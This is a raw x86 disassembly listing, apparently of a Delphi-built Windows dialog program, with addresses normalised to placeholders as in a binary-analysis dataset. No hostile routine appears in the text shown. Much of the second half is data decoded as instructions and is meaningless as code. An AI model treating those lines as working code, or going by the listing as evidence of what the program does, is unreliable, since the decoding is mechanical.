mov eax ebx
mov ecx r-xdata
mov edx esi
call sub_4042b4
mov eax [ ebx ]
call sub_404468
mov dl 0x7c
call sub_40c5a0
test eax eax
je r-xdata
mov [ eax ] 0x0
inc eax
mov dl 0x7c
call sub_40c5a0
test eax eax
jne r-xdata
sub_427d90
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_428041
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x7c ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea eax [ ebp - 0x68 ]
xor ecx ecx
mov edx 0x58
call sub_402c64
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
mov [ ebp - 0x68 ] 0x4c
mov eax [ rw-data ]
cmp [ eax ] 0x4
jl r-xdata
mov [ ebp - 0x68 ] 0x58
jmp r-xdata
mov [ ebp - 0x48 ] 0x104
mov [ ebp - 0x48 ] 0xffef
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x5a
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x60 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x60 ]
call sub_427d40
mov eax [ ebp - 0x8 ]
call sub_404468
mov [ ebp - 0x5c ] eax
mov eax [ ebx + 0x64 ]
mov [ ebp - 0x50 ] eax
mov [ ebx + 0x68 ] eax
test [ ebx + 0x5c ] 0x40
je r-xdata
mov eax [ ebx + 0x6c ]
call sub_404468
mov [ ebp - 0x3c ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ ebp - 0x48 ]
add edx 0x2
lea eax [ ebp - 0xc ]
call sub_4045f4
mov eax [ ebp - 0xc ]
call sub_404468
mov esi eax
mov [ ebp - 0x4c ] esi
mov edx [ ebp - 0x48 ]
add edx 0x2
mov eax esi
xor ecx ecx
call sub_402c64
mov eax [ ebx + 0x78 ]
call sub_404468
mov edx eax
mov ecx [ ebp - 0x48 ]
mov eax [ ebp - 0x4c ]
call sub_408740
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
jae r-xdata
and edx 0x7f
bt [ ebx + 0x5c ] edx
mov eax r-xdata
mov [ ebp - 0x3c ] eax
jmp r-xdata
inc eax
add esi 0x4
cmp al 0x16
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x34 ] edx
mov eax [ ebx + 0x70 ]
call sub_404468
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0x20
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov esi rw-data
mov edx eax
cmp dl 0x1f
ja r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ ebp - 0x34 ] 0xfff7ffff
xor [ ebp - 0x34 ] 0x80000
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
test [ ebp - 0x32 ] 0x8
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ ebx + 0x5e ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_404468
mov [ ebp - 0x2c ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x78 ]
call sub_4085e4
lea eax [ ebp - 0x10 ]
mov ecx 0x1
mov edx 0x1
call sub_404508
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0x74 ]
call sub_404040
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jl r-xdata
xor eax eax
mov esi rw-data
mov [ ebp - 0x24 ] sub_427704
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x5a
jl r-xdata
jae r-xdata
and edx 0x7f
bt [ ebx + 0xb0 ] edx
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
mov [ ebp - 0x24 ] sub_4279dc
inc eax
add esi 0x4
cmp al 0x1
jne r-xdata
mov edx [ esi ]
or [ ebp - 0x14 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x64 ] eax
lea ecx [ ebp - 0x68 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov esi eax
test esi esi
je r-xdata
or [ ebp - 0x34 ] 0x40
mov [ ebp - 0x20 ] eax
mov edx eax
cmp dl 0x7
ja r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428048
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403fcc
retn
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_42819c
test [ ebp - 0x33 ] 0x4
je r-xdata
and [ ebx + 0x5c ] 0xffffff7f
or [ ebx + 0x5c ] 0x80
jmp r-xdata
and [ ebx + 0x5c ] 0xfffffffe
or [ ebx + 0x5c ] 0x1
jmp r-xdata
test [ ebp - 0x34 ] 0x1
je r-xdata
mov eax [ ebp - 0x50 ]
mov [ ebx + 0x64 ] eax
sub_428054
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov dl [ eax - 0x1 ]
mov eax esi
call sub_40c5a0
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx ebx
sub ecx esi
mov eax edi
mov edx esi
call sub_404098
inc ebx
mov eax edi
mov edx esi
call sub_4041a0
mov eax esi
call sub_4086f4
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
sub_42809c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_428181
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_428054
pop ecx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_428054
pop ecx
mov ebx eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_40852c
cmp [ eax ] 0x5c
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x7c ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x5c
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404270
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428188
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fcc
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x7c ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_428054
pop ecx
mov ebx eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_404268
cmp eax 0x3
jle r-xdata
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4042b4
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x1 ] 0x3a
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2 ] 0x5c
je r-xdata
sub_42819c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_428247
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp - 0x8 ]
test [ eax + 0x5c ] 0x40
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x5c ] 0x40
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x5e ] 0x1
jne r-xdata
push ebp
mov eax [ edx + 0x1c ]
mov edx [ ebp - 0x8 ]
add edx 0x78
call sub_428054
pop ecx
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x78 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x7c ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
push ebp
mov eax [ edx + 0x1c ]
call sub_42809c
pop ecx
lea ecx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x7c ]
xor edx edx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax 0x78
call sub_403ffc
jmp r-xdata
mov [ ebp - 0x1 ] 0x20
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42824e
lea eax [ ebp - 0xc ]
call sub_403fa8
retn
sub_428254
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
push 0x0
push esi
xor ecx ecx
xor edx edx
xor eax eax
call sub_412b10
test [ ebx + 0x5e ] 0x1
jne r-xdata
push esi
push edi
call GetClientRect
jmp r-xdata
push esi
push 0x45f
push edi
call GetDlgItem
push eax
call GetWindowRect
push 0x2
push esi
mov eax [ ebx + 0x3c ]
push eax
push 0x0
call MapWindowPoints
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4282a8
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x78 ]
call sub_403ffc
cmp [ ebx + 0x3c ] 0x0
je r-xdata
mov eax esp
push eax
push 0x105
push 0x465
mov eax [ ebx + 0x3c ]
push eax
call GetParent
push eax
call SendMessageA
mov edx esi
mov eax esp
call sub_4088c8
jmp r-xdata
add esp 0x108
pop esi
pop ebx
retn
sub_428310
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov eax esi
call sub_404268
mov ebx eax
cmp ebx 0x1
jle r-xdata
lea eax [ edi + 0x6c ]
push eax
mov ecx ebx
mov edx 0x1
mov eax esi
call sub_4044c8
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40c35c
test al al
je r-xdata
mov ecx ebx
dec ecx
mov edx esi
mov eax r-xdata
call sub_40c390
test al al
jne r-xdata
dec ebx
sub_428440
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_408d38
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_4284db
add [ edi ] cl
add [ eax ] al
add al dh
daa
inc edi
add [ eax + 0x473b ] ah
add [ eax ] al
add ah ch
daa
inc edi
add [ eax + 0x473e ] dl
add [ eax ] al
add al ch
daa
inc edi
add [ ebx + edi + 0x47 ] dl
add [ eax ] al
add [ eax ] al
add ah ah
daa
inc edi
add ah dh
aas
inc edi
add [ eax ] al
add [ eax ] al
add al ah
daa
inc edi
add [ esi + edi + 0x47 ] ch
add [ eax ] al
fsub [ edi ]
inc edi
add [ esi + edi ] ch
inc edi
add [ eax ] al
add [ eax ] al
add al bl
daa
inc edi
add [ edi + edi + 0x47 ] ch
add [ eax ] al
add [ eax ] al
add ah dl
daa
inc edi
add [ ebp + edi + 0x47 ] al
add [ eax ] al
add [ eax ] al
add al dl
daa
inc edi
add [ eax + 0x3e ] dl
inc edi
add [ eax ] al
add [ eax ] al
add ah cl
daa
inc edi
add [ ebp + edi + 0x47 ] ch
add [ eax ] al
add [ eax ] al
add al cl
daa
inc edi
add [ eax + 0x4740 ] ah
add [ eax ] al
add [ edi + 0x3bf00047 ] dl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x2bffb8d9 ] dl
aas
inc edi
add [ eax ] al
add [ eax ] al
add [ edi + 0x40280047 ] cl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x33ffb8d9 ] cl
cmp eax 0x47
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4285e6
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4285ed
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_404a30
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_4285f0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d7c
call sub_428440
mov eax [ r-xdata ]
call sub_413780
mov eax [ r-xdata ]
call sub_413820
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4137cc
sub_428632
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
xchg [ edx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x87
inc edx
add [ edx ] bl
xchg [ edx ] eax
add [ ecx ] 0x0
add [ eax - 0x63ffbc70 ] cl
mov eax [ 0x34ac0041 ]
inc eax
add al dh
0x34b40041 0x40
xor al 0xe3
inc ebx
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add ah ch
mov al [ 0xfffffffff0140042 ]
inc ebx
add [ esp ] cl
inc ebx
add [ eax ] al
inc ebp
inc ecx
add ah bl
out dx eax
inc ebx
add al dh
retn
sub_42868e
inc ebx
add [ ebx + eax * 8 + 0x43 ] bl
add [ eax ] cl
int 0x43
add [ ecx - 0x6163ffbf ] dh
inc ecx
add [ esi + ebx * 4 - 0x5e43ffbf ] dl
inc ecx
add [ eax + 0x42 ] dl
add [ esi + ebx * 8 - 0x5a3fffbd ] ah
inc edx
add [ eax - 0x21 ] dh
inc ebx
add [ edx + eax * 8 + 0x43 ] ah
add [ eax + 0xc0043c9 ] ch
leave
inc ebx
add [ edx + edx * 8 ] dh
inc ebx
add [ ecx + eax * 8 - 0x3e4fffbd ] ch
inc ebx
add [ ecx + esi * 8 - 0xe27ffbd ] ch
inc ebx
add al dh
int3
sub_428d26
inc ebx
add ah bh
test [ ebx ] 0x8
int 0x43
add [ ecx - 0x6163ffbf ] dh
inc ecx
add [ esi + ebx * 4 - 0x5e43ffbf ] dl
inc ecx
add ah bh
cmpsd [ esi ] [ edi ]
inc edx
add [ edi - 0x51afffbc ] dh
inc edx
add [ ecx + eax * 2 - 0x3d9bffbc ] bl
inc ebx
add [ eax - 0x2fffbbc9 ] dh
aaa
inc esp
add al ch
xor al 0x44
add [ ecx + eax * 8 - 0x3e4fffbd ] ch
inc ebx
add [ ecx + esi * 8 - 0xe27ffbd ] ch
inc ebx
add al dh
int3
sub_428e48
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x428f
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx * 4 + 0x42 ] bl
add [ eax ] ch
add al [ eax ]
add al cl
mov [ edx ] es
pushfd
mov eax [ 0x34ac0041 ]
inc eax
add al dh
0x34b40041 0x40
adc [ edx ] 0x44
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ esp + edx * 2 ] cl
inc esp
add [ eax ] ah
inc edx
inc esp
add [ eax + 0xa ] cl
inc esp
add [ eax ] al
inc ebp
inc ecx
add ah bl
out dx eax
inc ebx
add al dh
retn
sub_428ea2
inc ebx
add ah bh
test [ ebx ] 0x8
int 0x43
add [ ecx - 0x6163ffbf ] dh
inc ecx
add [ esi + ebx * 4 - 0x5e43ffbf ] dl
inc ecx
add ah bh
cmpsd [ esi ] [ edi ]
inc edx
add [ edi - 0x51afffbc ] dh
inc edx
add [ ecx + eax * 2 - 0x3d9bffbc ] bl
inc ebx
add [ eax - 0x2fffbbc9 ] dh
aaa
inc esp
add al ch
xor al 0x44
add [ ecx + eax * 8 - 0x3e4fffbd ] ch
inc ebx
add [ ecx + esi * 8 - 0xe27ffbd ] ch
inc ebx
add al dh
int3
sub_428fa6
adc eax [ ecx ]
and [ edx ] al
add bh bh
and al 0xac
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
loopne r-xdata
add al [ eax ]
add [ eax ] al
adc [ eax ] al
or al [ edx + 0x65 ]
jbe r-xdata
inc ebx
add [ ecx ] ah
add bh bh
je r-xdata
add [ ebx ] dl
add [ ebx ] cl
inc edx
outsd
insb
dec edi
jne r-xdata
add [ eax ] al
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
inc ebx
add [ eax ] dl
retn
add [ eax ] al
call [ esi ]
jb r-xdata
sbb al 0x2
add bh bh
mov al [ 0x10042ac ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
jge r-xdata
add [ 0x6f6c6f43 ] al
jb r-xdata
add ah bl
rol [ ebx ] 0x1
add [ eax ] al
add [ eax - 0xfffff1 ] al
push ss
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
inc ebx
jb r-xdata
add [ eax ] al
mov [ ebx ] es
adc al 0x2
add bh bh
push 0x10042ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
add [ eax ] dl
outsd
outsb
jae r-xdata
add [ eax + eax ] dh
push esp
inc ebx
add [ ecx ] al
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
je r-xdata
add [ eax ] al
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
jb r-xdata
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
inc esp
rol [ ebx ] 0x1
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al [ eax ]
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x8b586564
inc ebx
add [ eax ] bl
add al [ eax ]
inc [ esp + ebp * 4 + 0x10042 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc eax [ eax ]
or eax [ edx + 0x6f ]
add [ eax ] al
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x48ff0001 ] ah
cmp [ eax + eax + 0x6c ] al
cmp [ eax + eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
add [ eax ] al
insb
mov [ gs : ebx + eax * 2 ] bh
and bh cl
inc ebx
add [ eax - 0x31 ] dl
inc ebx
add [ edi + ebp * 8 ] bl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070015 ] al
popad
jo r-xdata
add [ eax ] al
sbb al [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
mov al [ gs : 0x7a004375 ]
add [ eax ] al
adc [ eax ] al
test al 0x1
add bh bh
in al 0x22
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
[ 0x1ff0002 ]
jae r-xdata
inc ebx
jne r-xdata
inc eax
add [ edi - 0x6300ffff ] ah
cmp [ eax + eax + 0x1 ] eax
xor eax [ eax + eax + 0x10 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
push ebp
jae r-xdata
add [ ecx ] al
imul ebp [ edi + 0x6e ] sub_41b0a8
jo r-xdata
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add al ch
dec eax
inc esp
add [ eax + eax + 0x21ffe00 ] bh
add bh bh
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
adc [ eax + 0x61 ] dl
jb r-xdata
insb
push edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ ebx ] cl
inc esi
jne r-xdata
add bh bh
sbb eax 0x1ff0002
jb r-xdata
add bh bh
rcl al 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
outsb
je r-xdata
outsb
imul ebp [ esi + 0x74 ] r-xdata
push 0x14ff0000
rol [ ebx ] 0x1
and al 0xd0
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040020 ] al
outsd
outsb
je r-xdata
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
jl r-xdata
add [ eax - 0x80000000 ] al
sub [ eax ] eax
outsb
add [ ecx ] 0x0
add [ eax ] al
and eax 0x61500b00
jb r-xdata
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
add [ eax ] al
add [ eax ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
call 0xffffffffbc42d72d
add [ eax ] al
adc [ eax ] al
push ds
add al [ eax ]
[ esi ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
push es
dec esp
outsd
arpl [ ebx + 0x65 ] bp
add [ fs : eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
push cs
push eax
popad
jb r-xdata
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ eax ] dl
sbb al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
movsb [ edi ] [ esi ]
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
outsb
je r-xdata
je r-xdata
jne r-xdata
add [ ecx ] 0x0
add [ eax ] al
daa
add [ esi ] cl
outsb
je r-xdata
inc esp
add [ ecx ] al
je r-xdata
outsb
xor [ eax ] 0x0
jpe r-xdata
inc eax
into
inc ebx
add [ edi + ebp * 8 + 0x43 ] bl
add [ eax + 0x1 ] al
sub al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x70656c62
add [ ebx ] 0xffffffc0
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002d ] al
outsb
inc ebx
popad
outsb
push edx
jae r-xdata
jo r-xdata
adc [ eax ] al
0x94ff0000 0x43d0
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
popad
jb r-xdata
push cs
je r-xdata
inc esi
and al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
in al 0xd0
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
push eax
popad
jb r-xdata
add [ edx ] cl
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x4f0a0033 ] al
outsb
js r-xdata
add [ eax ] al
lodsb [ esi ]
adc eax 0x1200041
add bh bh
and [ ecx ] al
add bh bh
mov esp 0x43ef
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002e ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
enter 0x0 0xff
enter 0x0 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
movsb [ edi ] [ esi ]
add [ eax ] eax
outsb
jne r-xdata
jo r-xdata
outsd
add [ es : edx ] cl
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
dec esp
rol [ ebx ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
cmp [ eax + eax + 0x24 ] al
cmp [ eax + eax + 0x1 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
test eax 0x78ff0001
cmp [ eax + eax + 0x1 ] al
add [ eax ] 0x0
add [ eax + 0x4f090037 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
xor [ eax + 0xe80043 ] al
add bh bh
call 0x241956a
push eax
outsd
jo r-xdata
or cl [ edi + 0x6e ]
jb r-xdata
adc [ eax ] al
cdq
add [ eax ] al
push [ eax - 0x30 ]
inc ebx
add [ eax ] bh
rol [ ebx ] 0x1
add [ eax ] al
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
add [ eax ] al
sub [ ecx ] 0x0
retn 0x44
inc edi
je r-xdata
lodsb [ si ]
adc eax 0x1c00041
add bh bh
rol [ ecx ] 0x0
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
add [ eax ] al
jo r-xdata
or cl [ edi + 0x6e ]
jb r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] eax
inc [ ecx ]
push cs
dec edi
outsb
inc ebx
outsd
outsb
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
inc esp
jle r-xdata
imul esi [ ebp + 0x49 ] 0x446f666e
jle r-xdata
dec edi
jb r-xdata
xor al [ eax ]
jg r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ebx ] 0xff0001b0
mov al 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or cl [ edi + 0x6e ]
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add [ eax + 0x4f070038 ] al
add [ eax ] al
dec edi
jbe r-xdata
je r-xdata
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9419566
add [ eax ] al
inc [ ecx ]
adc eax 0x1280041
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
or cl [ edi + 0x6e ]
cwde
add al ah
add [ eax ] al
jmp eax
jae r-xdata
outsb
dec ebp
outsd
jne r-xdata
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003b ] al
add [ ebx ] 0x0
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
outsb
inc esp
outsd
ja r-xdata
xor [ esi ] 0x0
or [ edi + 0x6e ] ecx
adc eax 0x1c80041
outsd
arpl [ ebx - 0x28 ] bp
add [ ebx ] 0x18
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
jb r-xdata
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0035 ] al
outsb
jo r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
inc edx
add [ eax ] al
jb r-xdata
push ebx
or ecx [ edi + 0x6e ]
dec ebp
mov esp 0xd800437e
add [ eax ] al
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
je r-xdata
add [ ebx ] dl
dec edi
outsb
inc ebx
